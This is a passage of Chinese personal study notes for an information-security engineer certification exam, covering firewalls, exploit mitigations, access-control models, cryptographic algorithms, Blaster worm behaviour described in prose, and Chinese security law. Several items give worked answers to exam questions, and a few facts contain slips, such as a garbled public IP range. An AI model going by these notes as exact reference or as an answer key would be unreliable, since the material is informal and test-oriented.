<p>(6)发送命令给远端的机器使它回联已经受到感染的机器并下载Msblast.exe。</p>
<p>(7)检查当前日期及月份，若当前日期为16日或以后，或当前月份处在9月到12月之间，则W32.Blaster.Worm 蠕虫将对windowsupdate.com发动TCP同步风显拒绝服务攻击.</p>
<p>16、防火墙是由一些软、硬件组合而成的网络访问控制器，它根据一定的安全规则来控制流过防火墙的网络包，如禁止或转发，能够屏蔽被保护网络内部的信息、拓扑结构和运行状况，从而起到网络安全屏障的作用。防火墙一般用来将内部网络与因特网或者其他外部网络互相隔 离，限制网络互访，保护内部网络的安全。防火墙的安全策略有两种类型:黑名单策略和白名单策略。<br>防火墙的功能主要有以下几个方面:<br>1.过滤非安全网络访问。将防火墙设置为只有预先被允许的服务和用户才能通过防火墙，禁止未授权的用户访问受保护的网络，降低被保护网络受非法攻击的风险，</p>
<p>2.限制网络访问。防火墙只允许外部网络访问受保护网络的指定主机或网络服务，通常受保护网络中的Mail.FTP、WWW服务器等可让外部网访问，而其他类型的访问则予以禁止。防火墙也用来限制受保护网络中的丰机访问外部网络的某些服务，例如某些不良网址。<br>3.网络访问审计。防火墙是外部网络与受保护网络之间的唯一网络通道，可以记录所有通过它的访问，并提供网络使用情况的统计数据。依据防火墙的日志，可以掌握网络的使用情况，例如网络通信带宽和访问外部网络的服务数据。防火墙的日志也可用于入侵检测和网络攻击取证。</p>
<p>4.网络带宽控制。防火墙可以控制网络带宽的分配使用，实现部分网络质量服务(QoS)保障。</p>
<p>5.协同防御。防火墙和入侵检测系统通过交换信息实现联动，根据网络的实际情况配置并修改安全策略，增强网络安全。<br>尽管防火墙有许多防范功能，但也有一些力不能及的地方。比如:</p>
<p>防火墙功能缺陷，防火墙主要安全缺陷如下:</p>
<p>防火墙不能完全防止感染病毒的软件或文件传输</p>
<p>防火墙不能防止基于数据驱动式的攻击</p>
<p>防火墙不能完全防止后门攻击。</p>
<p>17、路由器使用Enable secret命令保存口今密文</p>
<p>18、Unix&#x2F;Linux操作系统的常见日志文件</p>
<p>日志文件wtmp:记录每一次用户登录和注销的历史信息。</p>
<p>utmp:记录当前登录的每个用户</p>
<p>acct:记录每个用户使用过的命令</p>
<p>lastlog:记录用户最近成功登录的时间</p>
<p>19、网络安全漏洞利用防范技术主要针对漏洞触发利用的条件进行干扰或拦截，以防止攻击者成功利用漏洞。常见的网络安全漏洞利用防范技术主要如下。</p>
<p>1.地址空间随机化技术（ASLR）</p>
<p>缓冲区溢出攻击是利用缓冲区溢出漏洞所进行的攻击行动，会以shelcode地址来覆盖程序原有的返回地址。地址空间随机化(AddressSpaceLayout Randomizaton，ASLR)就是通过对程序加载到内存的地址进行随机化处理，使得攻击者不能事先确定程序的返回地址值，从而降低攻击成功的概率。目前，针对Linux系统，通过ExecShield、PaX工具可以实现程序地址空间的随机化处理。<br>2.数据执行阻止（DEP）<br>数据执行阻止(DataExecution Prevention，DEP)是指操作系统通过对特定的内存区域标注为非执行，使得代码不<br>能够在指定的内存区域运行。利用DEP，可以有效地保护应用程序的堆栈区域，防止被攻击者利用。</p>
<p>3.SEHOP</p>
<p>SEHOP是Structured Exception Handler Overwrite Protection的缩写，其原理是防止攻击者利用Structured Exception Handler(SEH)重写。</p>
<p>4.堆栈保护<br>堆栈保护(StackProtection)的技术原理是通过设置堆栈完整性标记以检测函数调用返回地址是否被篡改，从而阻止攻击者利用缓冲区漏洞。<br>5.虚拟补丁<br>虚拟补丁的工作原理是对尚未进行漏洞永久补丁修复的目标系统程序，在不修改可执行程序的前提下，检测进入目标系统的网络流量而过滤掉漏洞攻击数据包，从而保护目标系统程序免受攻击。虚拟补丁通过入侵阻断、Web防火墙等相关技术来实现给目标系统程序“打补丁”，使得黑客无法利用漏洞进行攻击。</p>
<p>20.Windows用户登录到系统时，WinLogon进程为用户创建访问令牌，包含用户及所属组的安全标识符(SID)，作为用户的身份标识。</p>
<p>文件等客体则含有自主访问控制列表(DACL)，标明谁有权访问，</p>
<p>还含有系统访问控制列表(SACL)，标明哪些主体的访问需要被记录。</p>
<p>用户进程访问客体对象时，通过WIN32子系统向核心请求访问服务，</p>
<p>核心的安全参考监视器(SRM)将访问令牌与客体的DACL进行比较，决定客体是否拥有访问权限，</p>
<p>同时检查客体的SACL，确定本次访问是否落在既定的审计范围内，是则送至审计子系统。</p>
<p>21.unix命令</p>
<p>rmdir，是一个linux命令，用于删除空目录<br>pwd显示当前所处的目录，该命令显示整个路径名。<br>scp 命令用于 Linux 之间复制文件和目录。<br>cmp 命令用于比较两个文件是否有差异。当相互比较的两个文件完全一样时，则该指令不会显示任何信息。若发现有所差异，预设会标示出第一个不同之处的字符和列数编号。</p>
<p>22.交换机是构成网络的基础设备，主要的功能是负责网络通信数据包的交换传输。目前，工业界按照交换机的功能变化，将交换机分为第一代交换机、第二代交换机、第三代交换机、第四代交换机、第五代交换机。第二代交换机又称为以太网交换机，工作于OSI的数据链路层，称为二层交换机。二层交换机识别数据中的MAC地址信息，并根据MAC地址选择转发端口。</p>
<p>23.认证一般由标识(Identification)和鉴别(Authentication)两部分组成。标识是用来代表实体对象(如人员、设备、数据、服务、应用)的身份标志，确保实体的唯一性和可辨识性</p>
<p>24.Oracle数据库建立数据库保险库(DatabaseVault，DV)机制，该机制用于保护敏感数据，具有防止数据系统未授权变更、多因素可信授权、职责隔 离、最小化特权的功能。DV机制通过设置安全域(Realm)和命令规则(Command Rules)对特权进行控制</p>
<ol start="25">
<li></li>
</ol>
<p><img src="/../image/Soft-exam-intermediate/PCBC%E5%8A%A0%E5%AF%86.png"></p>
<p>图为明密文链接工作原理图，即PCBC。官方教材（第一版）P109。<br>电码本模式ECB直接利用分组密码对明文的各分组进行加密。<br>计数模式（CTR模式）加密是对一系列输入数据块（称为计数）进行加密，产生一系列的输出块，输出块与明文异或得到密文。<br>密文反馈模式（CFB模式）。在CFB模式中，前一个密文分组会被送回到密码算法的输入端。</p>
<p>26.监控网络流量并不是监控流量的具体内容，网络流量是单位时间内通过设备的信息量，即水流</p>
<ol start="27">
<li></li>
</ol>
<p>（1）计算安全的：如果破译加密算法所需要的计算能力和计算时间是现实条件所不具备的，那么就认为相应的密码体制是满足计算安全性的。这意味着强力破解证明是安全的，即实际安全。<br>（2）可证明安全的：如果对一个密码体制的破译依赖于对某一个经过深入研究的数学难题的解决，就认为相应的密码体制是满足可证明安全性的。这意味着理论保证是安全的。<br>（3）无条件安全的：如果假设攻击者在用于无限计算能力和计算时间的前提下，也无法破译加密算法，就认为相应的密码体制是无条件安全性的。这意味着在极限状态上是安全的。</p>
<p>只要需要接收，就没有绝对安全的存在</p>
<p>28.可以理解的是内网IP地址的常用划分为专用地址范围</p>
<p>专用地址范围：<br>A类：10.0.0.0-10.255.255.255；<br>B类：172.16.0.0-172.31.255.255；<br>C类：192.168.0.0-192.168.255.255。</p>
<p>公有IP地址分为：<br>A：0.0.0.1–9.255.255.255 &amp; 11.0.0.0–126.255.255.255；<br>B：128.0.0.0–172.15.255.255 &amp; 172.32.0.0–191.255.255.255；<br>C：192.0.0.0–192.167.255.255 &amp; 192.169.0.0–223.169.255.255。</p>
<ol start="29">
<li></li>
</ol>
<p>密码系统一般从以下三个方面进行分类：<br>一是按照密码系统对明文的处理方法分为分组密码和序列密码；<br>二是按将明文转化为密文的操作类型分为替换密码和位移密码；<br>三是按密钥的使用个数分为对称密码体制和非对称密码体制。</p>
<ul>
<li><strong>第一维</strong>（分组&#x2F;序列）是<strong>操作模式</strong>。</li>
<li><strong>第二维</strong>（替换&#x2F;置换）是<strong>基础构件</strong>。</li>
<li><strong>第三维</strong>（对称&#x2F;非对称）是<strong>系统架构</strong></li>
</ul>
<p>30.信息安全保护等级分为：用户自主保护级、系统审计保护级、安全标记保护级、结构化保护级、访问验证保护级。其中结构化保护级要求对所有主体和客体进行自主和强制访问控制。</p>
<p>第一级，用户自主保护级：本级的计算机信息系统可信计算基通过隔 离用户与数据，使用户具备自主安全保护的能力。它具有多种形式的控制能力，对用户实施访问控制，即为用户提供可行的手段，保护用户和用户组信息，避免其他用户对数据的非法读写与破坏。</p>
<p>第二级，系统审计保护级：与用户自主保护级相比，本级的计算机信息系统可信计算基实施了粒度更细的自主访问控制，它通过登录规程、审计安全性相关事件和隔 离资源，使用户对自己的行为负责。</p>
<p>第三级，安全标记保护级：本级的计算机信息系统可信计算基具有系统审计保护级所有功能。此外，还提供有关安全策略模型、数据标记以及主体对客体强制访问控制的非形式化描述；具有准确地标记输出信息的能力；消除通过测试发现的任何错误。</p>
<p>第四级，结构化保护级：本级的计算机信息系统可信计算基建立于一个明确定义的形式化安全策略模型之上，它要求将第三级系统中的自主和强制访问控制扩展到所有主体与客体。此外，还要考虑隐蔽通道。本级的计算机信息系统可信计算基必须结构化为关键保护元素和非关键保护元素。计算机信息系统可信计算基的接口也必须明确定义，使其设计与实现能经受更充分的测试和更完整的复审。加强了鉴别机制；支持系统管理员和操作员的职能；提供可信设施管理；增强了配置管理控制。系统具有相当的抗渗透能力。</p>
<p>第五级，访问验证保护级：本级的计算机信息系统可信计算基满足访问监控器需求。访问监控器仲裁主体对客体的全部访问。访问监控器本身是抗篡改的；必须足够小，能够分析和测试。为了满足访问监控器需求，计算机信息系统可信计算基在其构造时，排除那些对实施安全策略来说并非必要的代码；在设计和实现时，从系统工程角度将其复杂性降低到最小程度。支持安全管理员职能；扩充审计机制，当发生与安全相关的事件时发出信号；提供系统恢复机制。系统具有很高的抗渗透能力。</p>
<ol start="31">
<li></li>
</ol>
<p><img src="/../image/Soft-exam-intermediate/ECB%E5%8A%A0%E5%AF%86.png"></p>
<p>分组密码常用的工作模式包括：电码本模式（ECB模式）、密码反馈模式（CFB模式），密码分组链接模式（CBC模式），输出反馈模式（OFB模式）。下图描述的是（ECB模式）（图中Pi表示明文分组，Ci表示密文分组）</p>
<ol start="32">
<li></li>
</ol>
<p>《中华人民共和国网络安全法》由中华人民共和国第十二届全国人民代表大会常务委员会第二十四次会议于2016年11月7日发布，自2017年6月1日起实施。</p>
<ol start="33">
<li></li>
</ol>
<p>​                                               <strong>SHA1算法将任意长度的明文加密成固定长度为160位的消息摘要。</strong>  </p>
<p>​						<strong>SHA-1算法对输入按512位进行分组，并以分组为单位进行处理。</strong></p>
<p>​				<strong>DES算法中，64位密钥经过置换选择1、循环左移、置换选择2等变换，产生16个48位长的子密钥</strong></p>
<ol start="34">
<li></li>
</ol>
<p>ISO安全体系结构的相关知识。<strong>ISO安全体系结构的5种安全服务包括：鉴别服务、访问控制、数据完整性、数据保密性、抗抵赖性</strong>。数据包过滤也是一种网络安全技术，用于筛选通过计算机网络的数据包，一允许或拒绝其通过网络设备。数据包过滤器通常用户保护网络免受未经授权的访问和网络攻击</p>
<ol start="35">
<li></li>
</ol>
<p>数字水印技术通过在数字化的多媒体数据中嵌入隐蔽的水印标志，可以有效实现对数字多媒体数据的版权保护等功能。数字水印必须满足的基本应用需求是安全性、隐蔽性、鲁棒性。</p>
<p><strong>鲁棒性</strong> 指的是一个系统、组织或模型在遇到<strong>异常情况、意外输入、内部故障或外部干扰</strong>时，能够保持其<strong>基本功能正常、不崩溃、性能不急剧下降</strong>的能力。</p>
<p>简单来说，就是系统的 <strong>“健壮性”</strong> 或 <strong>“抗折腾能力”</strong></p>
<ol start="36">
<li></li>
</ol>
<p>最小化配置服务是操作系统中一项基本的安全机制，指在满足业务的前提下，尽量关闭不需要的服务和网络端口，以减少系统潜在的安全危害。Linux系统中，inetd.conf的文件属主为root可以实现网络服务最小化的操作。<br>答案选C。<br>A选项，inetd.conf的文件权限设置为600。<br>B选项，services的文件权限设置为644<br>D选项，应该是只开放与系统业务运行有关的网络通信端口。<br>希赛点拨：<br>实现UNIX&#x2F;Linux网络服务的最小化，具体安全要求如下：<br>（1）inetd.conf的文件权限设为600；<br>（2）inetd.conf的文件属主为root；<br>（3）services的文件权限设置为644；<br>（4）services的文件属主为root；<br>（5）在inetd.conf中，注销不必要的服务，比如finger、echo、chargen、rsh、rlogin、tftp服务；<br>（6）只开放与系统业务运行有关的网络通信端口。</p>
<ol start="37">
<li></li>
</ol>
<p>蜜罐技术是一种对攻击方进行欺骗的技术，通过布置一些作为诱饵的主机、网络服务或者信息，诱使攻击方对它们实施攻击，从而可以对攻击行为进行捕获和分析，了解攻击方所使用的工具与方法,推测攻击意图和动机，能够让防御方清晰地了解他们所面对的安全威胁,并通过技术和管理手段来增强实际系统的安全防护能力。蜜罐可以使用ARP 协议实现一台计算机绑定多个IP地址。</p>
<p>ARP代理可以实现一台计算机绑定多个IP地址，是一种正常的网络配置技术。当网络中的两个设备处于不同的子网上时，它们无法直接进行通信，需要通过路由器或者交换机进行转发。由于ARP无法穿过路由器或交换机，ARP请求和响应将不能直接传递，此时可以部署ARP代理解决。</p>
<p>其工作机制如下：</p>
<p>（1）当一台设备需要与不在同一物理网络段上的设备进行通信时，它会发出一个ARP请求，询问目标IP地址对应的MAC地址。<br>（2）如果目标设备确实位于另一个网络段，并且网络中存在配置了代理ARP的路由器，则该路由器会截获这个ARP请求。<br>（3）路由器会以自己的MAC地址作为响应，欺骗请求者认为目标设备就在本地网络上，但实际上路由器会负责将数据包转发到正确的网络段。</p>
<ol start="39">
<li></li>
</ol>
<p>ipsec–网络地址安全</p>
<p>IPSec VPN在公网上为两个私有网络提供安全通信通道,通过加密通道保证连接的安全，在两个公共网关间提供私密数据封包服务。IPSec 工作组制定了相关的IP安全系列规范：认证头(Authentication Header, 简称AH)、封装安全有效负荷(Encapsylatin Security Payload，简称ESP)以及密钥交换协议。IPSec VPN中，由IPAH协议提供数据源认证。</p>
<p>SKIP，互联网密钥交换协议。<br>IPESP，是一种安全协议，其用途在于保证IP包的保密性。<br>ISAKMP，互联网安全关联与密钥管理协议。</p>
<ol start="40">
<li></li>
</ol>
<p>访问控制是对信息系统资源进行保护的重要措施，适当的访问控制能够阻止未经授权的用户有意或者无意地获取资源。按照访问控制的实现方式，访问控制可以分为自主访问控制、强制访问控制等。自主访问控制是指客体的所有者按照自己的安全策略授予系统中的其他用户对其的访问权。</p>
<p>自主访问控制的实现方法包括基于行的自主访问控制和基于列的自主访问控制两大类。</p>
<p>其中，基于行的自主访问控制包括能力表、前缀表、口令；</p>
<p>基于列的自主访问控制包括保护位、访问控制表</p>
<ol start="41">
<li></li>
</ol>
<p>BiBa模型是一种强制访问控制模型，主要用于防止非授权修改系统信息，以保护系统的信息完整性。BiBa具有三个安全特性：简单安全特性、<em>特性、调用特性。其中，简单安全特性即主体不能向下读；</em>特性即主体不能向上写。</p>
<ol start="42">
<li></li>
</ol>
<p>Diffie-Hellman密钥交换协议是一种共享秘密的方案,该协议的目的是实现在两个用户之间安全交换一个秘密密钥。该协议的安全性依赖于计算离散对数的难度。</p>
<p>Hash 算法是指产生哈希值或杂凑值的计算方法。MD5算法是被广泛应用的一种 Hash算法，该算法以512比特数据块为单位处理输入，产生128比特的哈希值。</p>
<p>SHA算法同样也以512 位数据块为单位来处理输入，产生160 位的哈希值，具有比MD5 更强的安全性。</p>
<p>国产密码算法是指由国家密码研究相关机构自主研发，具有相关知识产权的商用密码算法。目前的国产密码算法中，<strong>SM1是对称加密算法，SM2属于非对称密码算法，SM3属于散列算法，SM4属于分组密码算法，SM9属于基于标识的密码算法</strong>。</p>
<ol start="43">
<li></li>
</ol>
<p>2019年5月13日，网络安全等级保护2.0正式发布，该标准于2019年12月1日正式实施。根据等级保护2.0的规定，云计算安全等级保护框架包括“一个中心，三重防护”，一个中心是指安全管理中心，三重防护包括：计算环境安全、区域边界安全和通信网络安全。其中安全管理中心负责针对整个系统提出安全管理方面的技术控制要求，通过技术手段实现集中管理。安全管理中心的管理内容包括系统管理、审计管理、安全管理和集中管控等。</p>
<h5 id="信息安全基础"><a href="#信息安全基础" class="headerlink" title="信息安全基础"></a>信息安全基础</h5><ol>
<li></li>
</ol>
<p>MAC：强制访问控制模型（BLP属于强制访问控制模型，BN模型又称Chinese Wall也属于强制访问控制模型）</p>
<p>DAC：自主访问控制模型（HRU模型属于自主访问控制模型）</p>
<p>RBAC： 基于角色的访问控制模型</p>
<ol start="2">
<li></li>
</ol>
<p><strong>防火墙</strong>（Firewall）</p>
<p><strong>入侵检测</strong>（IDS）</p>
<ol start="3">
<li></li>
</ol>
<p>秘密不低于等保三级</p>
<p>机密不低于等保四级</p>
<p>绝密不低于等保五级</p>
<ol start="4">
<li></li>
</ol>
<p><strong>计算机系统的安全级别分为四组七个等级</strong></p>
<p>具体为</p>
<p>D、C、（C1、C2)、B(B1、B2、B3)和A(1)</p>
<p>安全级别从左到右逐步提高，各级间向下兼容</p>
<p>D-未授权访问，包括DOS、WINDOWS98</p>
<p>C1-选择保护级（用户权限分离）</p>
<p>C2-访问控制环境的权力（用户划分更细，例如审计和管理）包括UNIX、LINUX、WindowsNT</p>
<p>B1-标识安全保护（标记完整性，例如签名）</p>
<p>B2-结构保护级别（安全标识，每个用户或者信息都有对应的安全级别，低不能访问高）</p>
<p>B3-安全域保护级别（硬件来防止未授权，u盾）</p>
<p>A1-验证设置级（可证明安全，追踪来源与去向，以防中间人攻击，每个步骤都验证）</p>
<ol start="5">
<li></li>
</ol>
<p>业务影响分析是在风险评估的基础行，分析各种信息安全时间发生时对业务功能可能产生的影响，进而确定应急响应的恢复目标</p>
<ol start="6">
<li></li>
</ol>
<p>BLP模型两条基本的规则：</p>
<p>①简单安全特性规则：主体只能向下读，不能向上读。主体的保密级别不小于客体的保密级别</p>
<p>②*特性规则：主体只能向上写，不能向下写。客体的保密级别不小于主体的保密级别</p>
<ul>
<li><strong>主体</strong>：主动发出访问行为的实体。通常是<strong>用户</strong>，或者是代表用户运行的<strong>进程&#x2F;程序</strong>。</li>
<li><strong>客体</strong>：被访问的、包含信息的被动实体。通常是<strong>文件、数据库、内存块、网络端口</strong>等。</li>
</ul>
<p>BiBa模型的</p>
<p>简单安全特性规则：主体不向下读</p>
<p>*特性规则：主体不能向上写</p>
<ol start="7">
<li></li>
</ol>
<p>攻击树模型起源于故障树分析方法。用于分析针对目标对象的安全威胁。该模型使用AND-OR两类节点</p>
<ol start="8">
<li></li>
</ol>
<p><strong>CIA三元组</strong>指的是信息安全的三个核心目标：CIA三性，C代表<strong>机密性</strong>（Confidentiality）、I代表<strong>完整性</strong>（Integrity）、A代表<strong>可用性</strong>（Availability）</p>
<ol start="9">
<li></li>
</ol>
<p>无形资产就是真看不到的</p>
<ol start="10">
<li></li>
</ol>
<p>简单地说，网络风险就是网络威胁发生的概率和所造成影响的乘积</p>
<ol start="11">
<li></li>
</ol>
<p>保护措施其目的是对网络管理对象进行风险控制</p>
<ol start="12">
<li></li>
</ol>
<p>《中华人民共和国个人信息保护法》是一部重要的法律，自2021年11月1日起施行。其中第十条 任何组织、个人不得非法收集、使用、加工、传输他人个人信息，不得非法买卖、提供或者公开他人个人信息；不得从事危害国家安全、公共利益的个人信息处理活动。</p>
<ol start="13">
<li></li>
</ol>
<p>网络信息安全领域“四大”顶级学术会议是S&amp;P、CCS、NDSS、 USENIX Security。其中USENIX Security被中国计算机学会(CCF)归为“网络与信息安全”A类会议(共分为A、B、C三类,A类最佳)。除此之外,CCF推荐的“网络与信息安全”B类会议有 Annual Computer</p>
<p>Security Applications Conference、International Symposium on Recent Advance in Intrusion</p>
<p>Detection等</p>
<ol start="14">
<li></li>
</ol>
<p><strong>PDRR</strong>是 Protection、 Detection、 Recovery、 Respons英文单词的缩写。PDRR改进了传统的只有保护的单一安全防御思想,强调信息安全保障的四个重要环节。<strong>保护</strong>( Protection)的内容主要有加密机制、数据签名机制、访问控制机制、认证机制、信息隐藏、防火墙技术等。<strong>检测</strong>( Detection)的内容主要有入侵检测、系统脆弱性检测、数据完整性检测、攻击性检测等。<strong>恢复</strong>( Recovery)的内容主要有数据备份、数据修复、系统恢复等。<strong>响应</strong>( Response)的内容主要有应急策略、应急机制、应急手段、入侵过程分析及安全状态评估等。</p>
<p><strong><code>P2DR模型</code><strong>包括四个主要部分:<strong>Policy</strong>(安全策略)、</strong>Protection</strong>(防护)、<strong>Detection(<strong>检测)和</strong>Response</strong> (响应)。</p>
<ol start="15">
<li></li>
</ol>
<p>在人员安全的工作安全方面，应遵守多人负责原则、任期有限原则、职责分离原则</p>
<p><strong>任期有限原则</strong></p>
<ol start="16">
<li></li>
</ol>
<p>等级保护制度是中国网络安全保障的特色和基石，一般等级保护建设的流程是：</p>
<p>定级、备案、建设整改、等级测评、运营维护</p>
<ol start="17">
<li></li>
</ol>
<p>软件安全能力成熟度模型分成五级，各级别的主要过程如下：</p>
<p>·CMMI级——补丁修补；</p>
<p>·CMM2级——渗透测试、安全代码评审；</p>
<p>·CMM3级——漏洞评估、代码分析、安全编码标准；</p>
<p>·CMM4级——软件安全风险识别、SDLC实施不同安全检查点；</p>
<p>·CMM5级——改进软件安全风险覆盖率、评估安全差距。</p>
<ol start="18">
<li></li>
</ol>
<p>五类安全服务包括**<code>认证（鉴别）服务</code><strong>、</strong><code>访问控制服务</code><strong>、</strong><code>数据保密性服务</code><strong>、</strong><code>数据完整性服务</code><strong>和</strong><code>抗否认性服务</code>**。</p>
<p>认证（鉴别）服务：在网络交互过程中，对收发双方的身份及数据来源进行验证。</p>
<p>访问控制服务：防止未授权用户非法访问资源，包括用户身份认证和用户权限确认。</p>
<p>数据保密性服务：防止数据在传输过程中被破解、泄露。</p>
<p>数据完整性服务：防止数据在传输过程中被篡改。</p>
<p>抗否认性服务：也称为抗抵赖服务或确认服务。防止发送方与接收方双方在执行各自操作后，否认各自所做的操作。</p>
<ol start="19">
<li></li>
</ol>
<p>一般来说，大数据是指非传统的数据处理工具的数据集，具有海量的数据规模、快速的数据流转、多样的数据类型和价值密度低等特征。</p>
<p>攻击者利用数据输入或数据平台缺陷，构造恶意数据并将其注入数据处理系统中，干扰数据处理系统的正常运行或误导计算。另一方面，数据获取隐患也会导致人工智能的安全问题。</p>
<p>数据交易是指数据供方和需方之间以数据商品作为交易对象，进行的以货币交换数据商品，或者以数据商品交换数据商品的行为。数据交易促进商业合作，但也形成潜在的安全风险。</p>
<p><strong>共识算法主要应用于区块链</strong>，验证交易的合法性和正确性这一部分，从而保持了各个节点的交易和区块数据的一致性。</p>
<ol start="20">
<li></li>
</ol>
<p>文件加密属于数字加密，它泄露了还是代表可以解开的，参考本地化的加密文件</p>
<ol start="21">
<li></li>
</ol>
<p>等保2.0标准分数为70分以上；</p>
<ol start="22">
<li></li>
</ol>
<p>RSA是非对称加密算法适合少量数据加密，<strong>SHA-1和MD5是摘要算法</strong>，RC5是对称加密算法，适合大量数据加密。</p>
<ol start="23">
<li></li>
</ol>
<p>rule 5 deny 123.1.1.0 0.0.6.0</p>
<p><strong>ACL掩码中0检测，1不检测</strong></p>
<p>0.0.6.0第三位转为二进制是00000110，123.1.1.0的第三位1转换为二进制是00000001，与掩码比较，也就是前5位和最后1位必须检测，第6、7位不检测可以是任意，将选项转换后。</p>
<ol start="24">
<li></li>
</ol>
<p>数据库存储加密技术包括：基于文件的、基于记录的、基于字段的。</p>
<ol start="25">
<li></li>
</ol>
<p>sql注入是从应用层进行攻击的</p>
<ol start="26">
<li></li>
</ol>
<p>调用函数返回地址在堆栈的最后一层</p>
<p><img src="/../image/Soft-exam-intermediate/%E5%A0%86%E6%A0%88.png"></p>
<ol start="27">
<li></li>
</ol>
<p>《信息安全技术 数据安全能力成熟度模型》，第3级是<code>充分定义</code></p>
<p><img src="/../image/Soft-exam-intermediate/%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E8%83%BD%E5%8A%9B%E6%88%90%E7%86%9F%E5%BA%A6%E6%A8%A1%E5%9E%8B.png"></p>
<ol start="28">
<li></li>
</ol>
<p>基于状态的防火墙收到数据包时，先检查数据包的<strong>有效性</strong>，若无效，则丢弃数据包，然后<strong>再查找会话表</strong>，若找到才转发，否则丢弃数据包。</p>
<p><img src="/../image/Soft-exam-intermediate/%E7%8A%B6%E6%80%81%E9%98%B2%E7%81%AB%E5%A2%99%E5%8C%85%E8%BF%87%E6%BB%A4%E6%B5%81%E7%A8%8B.png"></p>
<ol start="29">
<li></li>
</ol>
<p>当监测到网络攻击流量时，如大规模 DDoS 攻击，流量牵引技术将目标系统的流量动态转发到流量清洗中心来进行清洗。其中，流量牵引方法主要有 BGP、DNS。流量清洗即拒绝对指向目标系统的恶意流量进行路由转发，从而使得恶意流量无法影响到目标系统。</p>
<ol start="30">
<li></li>
</ol>
<p>安全事件可能性&#x3D;根号(威胁发生频率<code>*</code>脆弱性)&#x3D;根号(3<code>*</code>3)&#x3D;3<br>安全事件的损失&#x3D;根号(资产价值<code>*</code>脆弱性)&#x3D;根号(4<code>*</code>3)&#x3D;2倍根号3<br>安全事件风险值&#x3D;安全事件可能性<code>*</code>安全事件的损失&#x3D;6倍根号3</p>
<ol start="31">
<li></li>
</ol>
<p>RSA算法中，公钥为（e,n）&#x3D;(13,35)，则私钥d&#x3D;()<br>$$<br>n&#x3D;35，可知p&#x3D;5,q&#x3D;7;则</p>
<p>d<em>e≡1mod((p-1)</em>(q-1))，d&#x3D;13<br>$$</p>
<p>$$<br>13⋅d≡1(mod24)<br>意思是：寻找一个整数<br>d，使得<br>13×d 除以<br>24 的余数为<br>1。<br>$$</p>
<p>$$<br>13d≡1(mod24)<br>等价于存在整数<br>k，使得：<br>13d&#x3D;24k+1或者：13d−24k&#x3D;1<br>$$</p>
<ol start="32">
<li></li>
</ol>
<p>SHA-2，名称来自于安全散列算法2（英语：Secure Hash Algorithm 2）的缩写，一种密码散列函数算法标准，由美国国家安全局研发，属于SHA算法之一，是SHA-1的后继者。其下又可再分为六个不同的算法标准，包括了：SHA-224、SHA-256、SHA-384、SHA-512、SHA-512&#x2F;224、SHA-512&#x2F;256。后面的数字即是摘要的长度</p>
<ol start="33">
<li></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IPsec, （71） for Internet Protocol Security, is a security standard framework defined by the Internet Engineering Task Force (IETF). IPsec VPN is a VPN technology that (72) the IPsec protocol to achieve remote access, providing end-to-end encryption and authentication services for public and private networks. It specifies a series of protocol standards and is a relatively complete and (73) VPN technology. As a mature technology, VPN is widely used for networking and interconnection between organizational headquarters and branches. By leveraging an organization&amp;#39;s existing internet exit, it virtualizes a &amp;quot;(74)&amp;quot; to connect the organization&amp;#39;s branches with the headquarters, forming a large local area network. IPsec is not a specific protocol but a set of open protocol families that specify a series of protocol standards, including the Authentication Header (AH) protocol, (75) Security Payload (ESP) protocol, Internet Key Exchange (IKE) protocol, and several algorithms for network authentication and encryption.</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IPsec协议：IPsec全称为Internet Protocol Security，是由 Internet Engineering Task Force（IETF）定义的安全标准框架。IPsec VPN是采用IPsec协议来实现远程接入的一种VPN技术，用以提供公用和专用网络的端对端加密和验证服务。它规定了一系列的协议标准，是一套比较完整成体系的 VPN 技术。VPN 作为一项成熟的技术，广泛应用于组织总部和分支机构之间的组网互联，利用组织已有的互联网出口，虚拟出一条 “专线”，将组织的分支机构和总部连接起来，组成一个大的局域网。它不是具体指某个协议，而是一组开放的协议族，规定了一系列的协议标准，包括认证头协议（AH）、封装安全负载协议（ESP）、密钥管理协议（IKE）和用于网络认证及加密的一些算法等</span><br></pre></td></tr></table></figure>



<ol start="34">
<li></li>
</ol>
<p>PGP应用了多种密码技术</p>
<p>其中密钥管理算法选用RSA、数据加密算法选用IDEA、完整性检测和数字签名采用了MD5和RSA以及随机数生成器</p>
<h5 id="安全法规和标准"><a href="#安全法规和标准" class="headerlink" title="安全法规和标准"></a>安全法规和标准</h5><ol>
<li></li>
</ol>
<p>计算机犯罪是指利用信息科学技术且以计算机为犯罪对象的犯罪行为。具体可以从<strong>犯罪工具</strong>角度、犯罪关系角度、资产对象角度、信息对象角度等方面定义。</p>
<p>首先是</p>
<p><strong>犯罪工具</strong>则是利用计算机犯罪，即将计算机作为犯罪工具。以构成犯罪行为和结果的空间为标准，可分为预备性犯罪和实行性犯罪。对于前者，犯罪的后果必须通过现实空间而不是虚拟空间实现。</p>
<p>从犯罪关系角度，计算机犯罪是指与计算机相关的危害社会并应当处以刑罚的行为。</p>
<p>从资产对象角度，计算机犯罪是指以计算机资产作为犯罪对象的行为。例如公安部计算机管理监察司认为计算机犯罪是”以计算机为工具或以计算机资产作为对象实施的犯罪行为”。</p>
<p>从信息对象角度，计算机犯罪是以计算机和网络系统内的信息作为对象进行的犯罪，即计算机犯罪的本质特征是信息犯罪。</p>
<ol start="2">
<li></li>
</ol>
<p>《中华人民共和国网络安全法》第二十五条 网络运营者应当制定网络安全事件应急预案，及时处置系统漏洞、计算机病毒、网络攻击、网络侵入等安全风险；在发生危害网络安全的事件时，立即启动<strong>应急预案</strong>，采取相应的补救措施，并按照规定向有关主管部门报告。</p>
<ol start="3">
<li></li>
</ol>
<p><strong>业务连续性管理</strong>（business continuity management，BCM）找出组织有潜在影响的威胁及其对组织业务运行的影响，通过有效的应对措施来保护组织的利益、信誉、品牌和创造价值的活动，并为组织提供建设恢复能力框架的整体管理过程。</p>
<p>确定BCM战略具体包括事件的<strong>应急处理计划</strong>、<strong>连续性计划</strong>和<strong>灾难恢复计划</strong>等内容。</p>
<ol start="4">
<li></li>
</ol>
<p>涉密人员的脱密期应根据其接触、知悉国家秘密的密级、数量、时间等情况确定。一般情况下，核心涉密人员为3年至5年，重要涉密人员为2年至3年，一般涉密人员为1年至2年。</p>
<ol start="5">
<li></li>
</ol>
<p>即便是破坏了其他人的网络设备，没有破坏商用设备之类的，都不算威胁社会经济，虽然也是犯法，但不是这条法</p>
<ol start="6">
<li></li>
</ol>
